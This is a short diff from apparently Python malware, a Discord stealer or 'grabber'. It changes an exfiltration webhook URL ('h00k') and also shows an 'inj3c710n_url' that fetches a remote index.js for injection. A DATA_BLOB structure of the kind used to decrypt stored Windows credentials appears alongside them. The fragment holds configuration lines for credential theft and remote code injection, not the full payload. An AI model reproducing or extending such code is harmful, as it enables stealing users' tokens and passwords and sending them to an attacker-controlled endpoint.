@@ -71,7 +71,7 @@ for module in ModuleRequirements:
 
 
 
-h00k = "https://ptb.discord.com/api/webhooks/12345/test"
+h00k = "https://ptb.discord.com/api/webhooks/test"
 inj3c710n_url = f"https://raw.githubusercontent.com/0x00G/injection/main/index.js"
 
 class DATA_BLOB(Structure):
